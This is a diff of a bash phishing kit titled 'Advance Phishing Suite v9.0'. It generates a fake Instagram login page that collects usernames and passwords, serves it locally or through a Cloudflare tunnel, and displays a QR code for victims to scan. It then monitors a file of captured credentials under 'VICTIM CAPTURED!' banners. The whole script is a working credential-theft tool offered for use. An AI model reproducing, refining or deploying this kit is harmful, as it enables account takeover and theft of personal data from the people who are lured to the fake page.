@@ -1,66 +1,68 @@
 #!/bin/bash
 
-# ================================================
-# --- 0. USER CONFIGURATION (CUSTOM IMAGE) ---
-# Yahan apni image ka link dalo jo PC view me dikhani hai
-# Agar change karna hai to is link ko replace kar dena
-CUSTOM_IMG="https://uploads.onecompiler.io/447wf6ce2/44caqn8u9/Screenshot_2026-02-01_130807-removebg-preview.png"
-# ================================================
+# --- 1. CONFIGURATION (CUSTOM IMAGE) ---
+# Yahan apni image ka link dalo jo mobile me dikhani hai
+IMG_URL="https://static.cdninstagram.com/rsrc.php/v4/yF/r/reN9rvYdLTB.png"
 
-
-# --- 1. SETUP & QR DEPENDENCIES ---
+# --- 2. SYSTEM CHECK & SETUP ---
 clear
-# Colors
-R='\033[1;31m'
-G='\033[1;32m'
-C='\033[1;36m'
-Y='\033[1;33m'
+# Colors (Advance Theme)
+RED='\033[1;31m'
+GREEN='\033[1;32m'
+BLUE='\033[1;34m'
+CYAN='\033[1;36m'
+YELLOW='\033[1;33m'
+PURPLE='\033[1;35m'
 RESET='\033[0m'
 
-# Auto Install QR Tool
-if ! command -v qrencode &> /dev/null; then
-    echo -e "${Y}[*] Installing QR Code Drivers...${RESET}"
-    pkg install libqrencode -y > /dev/null 2>&1
-fi
-
-# Cleanup
+# Cleanup Old
 pkill -f php > /dev/null 2>&1
 pkill -f cloudflared > /dev/null 2>&1
 rm -rf auth/ cloud.log
 mkdir -p auth
 touch usernames.txt
 
-# OS Check & Mobile Fix Runner
+# --- [NEW] AUTO INSTALL QR DRIVERS ---
+if ! command -v qrencode &> /dev/null; then
+    echo -e "${YELLOW}[*] Installing QR Code Drivers...${RESET}"
+    pkg install libqrencode -y > /dev/null 2>&1
+fi
+
+# Detect OS (Mobile vs PC)
 if [ -d "/data/data/com.termux/files/usr" ]; then
+    # Android (Termux)
     RUNNER="termux-chroot"
     if ! command -v termux-chroot &> /dev/null; then
-        echo -e "${Y}[*] Installing Mobile Fix (Proot)...${RESET}"
+        echo -e "${YELLOW}[*] Installing Mobile Drivers...${RESET}"
         pkg install proot resolv-conf -y > /dev/null 2>&1
     fi
 else
+    # Linux (Kali/Ubuntu)
     RUNNER=""
 fi
 
-# Random Port (Fix for 'Address in use')
-PORT=$((3000 + RANDOM % 6000))
+# RANDOM PORT GENERATOR (The Fix)
+PORT=$((4000 + RANDOM % 5000))
 
-# --- 2. HEADER (ANURAG HKR) ---
+# --- 3. ADVANCE BANNER (ANURAG HKR) ---
 clear
-echo -e "${R}"
+echo -e "${CYAN}"
 cat << "EOF"
-   ___  ____  ____    ____  ____   ___  
-  / _ \|  _ \|  _ \  |  _ \|  _ \ / _ \ 
- | | | | |_) | |_) | | |_) | |_) | | | |
- | |_| |  _ <|  _ <  |  __/|  _ <| |_| |
-  \__\_\_| \_\_| \_\ |_|   |_| \_\\___/ 
-                                        
+    _    _   _ _   _ ____      _    ____    _   _ _  _______ 
+   / \  | \ | | | | |  _ \    / \  / ___|  | | | | |/ /  _ \ 
+  / _ \ |  \| | | | | |_) |  / _ \| |  _   | |_| | ' /| |_) |
+ / ___ \| |\  | |_| |  _ <  / ___ \ |_| |  |  _  | . \|  _ < 
+/_/   \_\_| \_|\___/|_| \_\/_/   \_\____|  |_| |_|_|\_\_| \_\
+                                                             
 EOF
 echo -e "${RESET}"
-echo -e "${Y}    >>> ANURAG HKR : QR EDITION v2 <<<    ${RESET}"
-echo -e "${C}==========================================${RESET}"
+echo -e "${PURPLE}      >>> ADVANCE PHISHING SUITE v9.0 <<<       ${RESET}"
+echo -e "${YELLOW}      >>>  CREATED BY : ANURAG HKR    <<<       ${RESET}"
+echo -e "${CYAN}====================================================${RESET}"
+echo -e "${GREEN}[+] System Assigned Port : ${RED}$PORT ${GREEN}(Safe Mode)${RESET}"
 echo ""
 
-# --- 3. HTML GENERATION (WITH CUSTOM IMAGE VARIABLE) ---
+# --- 4. YOUR ORIGINAL DESIGN (With Mobile Fix) ---
 cat > auth/index.php <<EOF
 <!DOCTYPE html>
 <html lang="en">
@@ -73,13 +75,12 @@ cat > auth/index.php <<EOF
 body{ background:#0b1116; color:#fff; }
 .main{ display:flex; min-height:100vh; }
 
-/* DESKTOP STYLES */
+/* DESKTOP STYLES (Your Original Design) */
 .left{ width:50%; padding:60px; background:linear-gradient(160deg,#000,#0b1116); display:flex; flex-direction:column; justify-content:center; }
 .left img.logo{ width:55px; margin-bottom:40px; }
 .left h1{ font-size:40px; font-weight:400; line-height:1.3; }
 .left h1 span{ color:#ff2d55; }
 .left .story{ margin-top:40px; width:280px; }
-
 .right{ width:50%; background:#121e26; display:flex; justify-content:center; align-items:center; }
 .card{ width:380px; padding: 20px; }
 .card h2{ font-size:20px; margin-bottom:20px; text-align: center; }
@@ -90,7 +91,7 @@ body{ background:#0b1116; color:#fff; }
 .new{ width:100%; padding:12px; border-radius:30px; border:1px solid #3b82f6; background:transparent; color:#3b82f6; }
 .meta{ text-align:center; margin-top:25px; opacity:.7; }
 
-/* MOBILE STYLES */
+/* MOBILE FIX (Responsive) */
 @media(max-width:900px){
     .main{ flex-direction:column; }
     .left{ display:none; } 
@@ -106,18 +107,20 @@ body{ background:#0b1116; color:#fff; }
     <div class="left">
         <img class="logo" src="https://uploads.onecompiler.io/447wf6ce2/44caqn8u9/Screenshot_2026-02-01_130807-removebg-preview.png">
         <h1>See everyday moments from <br> your <span>close friends.</span></h1>
-        <img class="story" src="$CUSTOM_IMG">
+        <img class="story" src="$IMG_URL">
     </div>
 
     <div class="right">
         <div class="card">
             <img class="mobile-logo" src="https://uploads.onecompiler.io/447wf6ce2/44caqn8u9/Screenshot_2026-02-01_130807-removebg-preview.png">
             <h2 style="font-family: sans-serif;">Instagram</h2>
+            
             <form action="login.php" method="POST">
                 <input class="input" type="text" name="u" placeholder="Mobile number, username or email address" required>
                 <input class="input" type="password" name="p" placeholder="Password" required>
                 <button class="btn" type="submit">Log in</button>
             </form>
+
             <div class="link">Forgotten password?</div>
             <button class="fb">Log in with Facebook</button>
             <button class="new">Create new account</button>
@@ -138,29 +141,29 @@ exit();
 ?>
 EOF
 
-# --- 6. EXECUTION ---
-echo -e "${G}[1] Localhost QR${RESET}"
-echo -e "${G}[2] Cloudflare QR (Worldwide)${RESET}"
+# --- 6. MENU & EXECUTION ---
+echo -e "${GREEN}[1] Localhost QR (Fast)${RESET}"
+echo -e "${GREEN}[2] Cloudflare QR (Worldwide)${RESET}"
 echo ""
-echo -ne "${Y}Select: ${RESET}"
+echo -ne "${YELLOW}Select Option: ${RESET}"
 read option
 
 if [[ $option == "1" ]]; then
-    echo -e "${Y}[*] Starting Local Server...${RESET}"
+    echo -e "${BLUE}[*] Starting Local Server on Port $PORT...${RESET}"
     $RUNNER php -S 127.0.0.1:$PORT -t auth > /dev/null 2>&1 &
     sleep 2
     
     LINK="http://127.0.0.1:$PORT"
-    echo -e "\n${G}[✔] SCAN THIS QR CODE (Local):${RESET}"
-    # Generate QR
+    echo -e "\n${GREEN}[✔] SCAN THIS QR CODE:${RESET}"
+    # QR GENERATION LOGIC
     qrencode -t ANSIUTF8 "$LINK"
     echo ""
-    echo -e "${C}Link: $LINK${RESET}"
+    echo -e "${GREEN}[✔] HOSTED: $LINK${RESET}"
 
 elif [[ $option == "2" ]]; then
-    # Cloudflare Setup
+    # Auto Download Cloudflare
     if [ ! -f "cloudflared" ]; then
-        echo -e "${Y}[*] Downloading Cloudflare Engine...${RESET}"
+        echo -e "${YELLOW}[*] Downloading Cloudflare Engine...${RESET}"
         ARCH=$(uname -m)
         if [[ "$ARCH" == *"aarch64"* || "$ARCH" == *"arm64"* ]]; then
             wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
@@ -170,22 +173,27 @@ elif [[ $option == "2" ]]; then
         chmod +x cloudflared
     fi
 
-    echo -e "${Y}[*] Starting Tunnel on Port $PORT...${RESET}"
+    echo -e "${BLUE}[*] Starting Services on Port $PORT...${RESET}"
+    # Start PHP on Random Port
     $RUNNER php -S 127.0.0.1:$PORT -t auth > /dev/null 2>&1 &
     sleep 2
+    
+    # Start Tunnel on Same Random Port
     $RUNNER ./cloudflared tunnel -url http://127.0.0.1:$PORT --logfile cloud.log > /dev/null 2>&1 &
     
-    echo -ne "${C}[*] Generating Link & QR... ${RESET}"
+    echo -ne "${YELLOW}[*] Generating Link & QR... ${RESET}"
     for i in {1..20}; do
         if [ -f cloud.log ]; then
             LINK=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cloud.log" | head -n 1)
             if [ ! -z "$LINK" ]; then
-                echo -e "\n\n${G}[✔] LINK GENERATED! SCAN NOW:${RESET}"
+                echo -e "\n\n${GREEN}========================================${RESET}"
+                echo -e "${YELLOW} URL: ${LINK} ${RESET}"
+                echo -e "${GREEN}========================================${RESET}"
                 echo ""
-                # GENERATE QR CODE
+                echo -e "${CYAN}[*] QR CODE GENERATED BELOW:${RESET}"
+                # QR GENERATION LOGIC ADDED HERE
                 qrencode -t ANSIUTF8 "$LINK"
                 echo ""
-                echo -e "${Y}URL: $LINK${RESET}"
                 break
             fi
         fi
@@ -194,13 +202,17 @@ elif [[ $option == "2" ]]; then
     done
 fi
 
-# --- 7. MONITOR ---
+# --- 7. LIVE MONITORING ---
 echo ""
-echo -e "${R}[*] Waiting for Victim to Scan...${RESET}"
+echo -e "${RED}[*] Waiting for Credentials...${RESET}"
 while true; do
     if [ -f usernames.txt ]; then
         tail -n 0 -f usernames.txt | while read line; do
-            echo -e "${RED}[!] CAPTURED: ${GREEN}$line${RESET}"
+            echo -e "${RED}╔════════════════════════════════╗${RESET}"
+            echo -e "${RED}║      VICTIM CAPTURED!          ║${RESET}"
+            echo -e "${RED}╠════════════════════════════════╣${RESET}"
+            echo -e "${GREEN} $line ${RESET}"
+            echo -e "${RED}╚════════════════════════════════╝${RESET}"
             echo -e "\a"
         done
     fi
